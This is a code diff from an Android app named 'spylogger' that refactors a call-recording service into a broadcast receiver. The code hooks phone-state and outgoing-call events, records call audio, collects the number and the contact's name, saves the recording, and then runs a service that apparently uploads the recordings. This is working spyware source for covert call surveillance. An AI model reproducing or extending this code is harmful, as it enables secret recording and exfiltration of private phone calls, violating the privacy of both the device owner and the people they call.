@@ -1,12 +1,8 @@
-package com.gravatasufoca.spylogger.services;
+package com.gravatasufoca.spylogger.receivers;
 
-import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
-import android.os.Binder;
-import android.os.IBinder;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -19,14 +15,16 @@ import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioGravacaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
+import com.gravatasufoca.spylogger.services.SendGravacoesService;
 import com.gravatasufoca.spylogger.utils.Utils;
-import com.utilidades.gravata.utils.Utilidades;
 
 import java.io.IOException;
 import java.sql.SQLException;
 import java.util.Date;
 
-public class RecordService extends Service{
+
+public class CallReceiver extends BroadcastReceiver {
+
 
 	private boolean remetente;
 	private RepositorioGravacao repositorioGravacao;
@@ -35,48 +33,38 @@ public class RecordService extends Service{
 	private String INCOMING_CALL_ACTION = "android.intent.action.PHONE_STATE";
 	private String OUTGOING_CALL_ACTION = "android.intent.action.NEW_OUTGOING_CALL";
 	private String phoneNumber;
+	private Context context;
 
 	private MediaRecorderHelper mediaRecorderHelper;
 
-	private final IBinder mBinder = new LocalBinder();
+	@Override
+	public void onReceive(Context context, Intent intent) {
+		this.context = context;
+		if(mediaRecorderHelper==null){
+			try {
+				mediaRecorderHelper=new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.AUDIO);
+				mediaRecorderHelper.setLigacao(true);
+			} catch (IOException e) {
+				e.printStackTrace();
+			}
+		}
 
-	public class LocalBinder extends Binder {
-		RecordService getService() {
-			return RecordService.this;
+		if(phoneListener==null){
+			phoneListener = new MyPhoneStateListener(intent);
+
+			TelephonyManager telephony = (TelephonyManager) context
+					.getSystemService(Context.TELEPHONY_SERVICE);
+			telephony.listen(phoneListener,
+					PhoneStateListener.LISTEN_CALL_STATE);
+		}else{
+			phoneListener.setIntent(intent);
+		}
+
+		if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction())) {
+			setPhoneNumber(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
 		}
 	}
-
-	private BroadcastReceiver callReceiver = new BroadcastReceiver() {
-
-		@Override
-		public void onReceive(Context context, Intent intent) {
-
-			if(mediaRecorderHelper==null){
-				try {
-					mediaRecorderHelper=new MediaRecorderHelper(getApplicationContext(), MediaRecorderHelper.TipoRecordedMidia.AUDIO);
-					mediaRecorderHelper.setLigacao(true);
-				} catch (IOException e) {
-					e.printStackTrace();
-				}
-			}
-
-			if(phoneListener==null){
-				phoneListener = new MyPhoneStateListener(intent);
-
-				TelephonyManager telephony = (TelephonyManager) context
-						.getSystemService(Context.TELEPHONY_SERVICE);
-				telephony.listen(phoneListener,
-						PhoneStateListener.LISTEN_CALL_STATE);
-			}else{
-				phoneListener.setIntent(intent);
-			}
-
-			if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction())) {
-				 setPhoneNumber(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
-		 	}
-		}
-
-	};
+	
 
 	class MyPhoneStateListener extends PhoneStateListener {
 
@@ -101,15 +89,15 @@ public class RecordService extends Service{
 
 					try {
 
-						repositorioGravacao = new RepositorioGravacaoImpl(getApplicationContext());
-						repositorioTopico=new RepositorioTopicoImpl(getApplicationContext());
+						repositorioGravacao = new RepositorioGravacaoImpl(context);
+						repositorioTopico=new RepositorioTopicoImpl(context);
 
 						Ligacao ligacao=new Ligacao();
 						ligacao.setRemetente(remetente);
 						ligacao.setData(new Date());
-						ligacao.setAudio(Utils.encodeBase64(mediaRecorderHelper.getRecordedFile()));
+						ligacao.setArquivo(Utils.getBytesFromFile(mediaRecorderHelper.getRecordedFile()));
 						ligacao.setNumero(phoneNumber);
-						ligacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,getApplicationContext().getContentResolver()));
+						ligacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,context.getContentResolver()));
 						ligacao.setDuracao(mediaRecorderHelper.getDuration());
 
 						Topico topico = repositorioTopico.findByName(ligacao.getNome());
@@ -125,10 +113,17 @@ public class RecordService extends Service{
 						ligacao.setTopico(topico);
 						repositorioGravacao.inserir(ligacao);
 
-						SendGravacoesService sendGravacoesService=new SendGravacoesService(getApplicationContext(),null);
-						sendGravacoesService.enviarTopicos();
 					} catch (SQLException e) {
 						e.printStackTrace();
+					}finally {
+						try {
+							repositorioGravacao.close();
+						}catch (Exception a){}
+						try {
+							repositorioTopico.close();
+						}catch (Exception a){}
+						SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
+						sendGravacoesService.enviarTopicos();
 					}
 
 				}
@@ -159,29 +154,6 @@ public class RecordService extends Service{
 	}
 
 
-	@Override
-	public void onCreate() {
-		super.onCreate();
-
-		IntentFilter intentToReceiveFilter = new IntentFilter();
-		intentToReceiveFilter.addAction(INCOMING_CALL_ACTION);
-		intentToReceiveFilter.addAction(OUTGOING_CALL_ACTION);
-		this.registerReceiver(callReceiver, intentToReceiveFilter);
-	}
-
-	@Override
-	public int onStartCommand(Intent intent, int flags, int startId) {
-//		super.onStart(intent, startId);
-
-		Utilidades.verifyPremium(this);
-		return START_STICKY;
-	}
-
-	@Override
-	public IBinder onBind(Intent arg0) {
-		return mBinder;
-	}
-
 	public void setPhoneNumber(String phoneNumber) {
 		this.phoneNumber = phoneNumber;
 	}
@@ -189,4 +161,5 @@ public class RecordService extends Service{
 	public void setRemetente(boolean remetente) {
 		this.remetente = remetente;
 	}
+
 }
